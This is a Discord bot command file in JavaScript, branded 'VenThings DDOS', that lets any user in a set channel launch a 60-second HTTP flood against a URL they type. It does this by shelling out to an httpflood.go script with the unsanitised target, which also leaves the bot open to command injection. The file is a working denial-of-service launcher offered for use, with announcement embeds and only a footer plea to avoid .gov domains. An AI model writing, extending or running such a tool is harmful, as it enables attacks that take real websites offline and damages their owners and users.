const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🚀 **Loading Please Wait** 🚀')
	.setDescription("`Usage: .HTTP-FLOOD https://example.com/`")
	.setFooter("Please do not attack websites with domain .gov")
	message.channel.send(embed1);
	return;
	}

var exec = require('child_process').exec
exec(`go run httpflood.go ${host} 1000 get 60 header.txt`, (error, stdout, stderr) => {
});
setTimeout(function(){ 
    console.log('The attack stopped the Discord ID:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🚀 **VenThings DDOS** 🚀')
	.setTimestamp()
	.setDescription("**► Attack is over 💥**")
	.setFooter('© Developer: VenThings#3280', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
 }, 60000); //time in milliseconds
var gifler = ["https://blarrow.tech/wp-content/uploads/2020/06/featureAYUSHDUBEY.gif"];
    var randomgif = gifler[Math.floor((Math.random() * gifler.length))];
console.log('Start Attacking ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🚀 **VenThings DDOS** 🚀')
	.setTimestamp()
  .setDescription("**𝐔𝐬𝐞𝐫**: `" + message.author.username + "` \n **𝐇𝐨𝐬𝐭**: `" + host + "` \n **𝐌𝐞𝐭𝐡𝐨𝐝**: `HTTP-FLOOD` \n **𝐓𝐢𝐦𝐞**: `60`")	
  .setFooter('© Developer: VenThings#3280', client.user.avatarURL)
	.setTimestamp()
	.setImage(randomgif)
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['HTTP-FLOOD'],
  permLevel: 0
}

exports.help = {
  name: 'HTTP-FLOOD',
  description: 'Tank',
  usage: 'HTTP-FLOOD'
}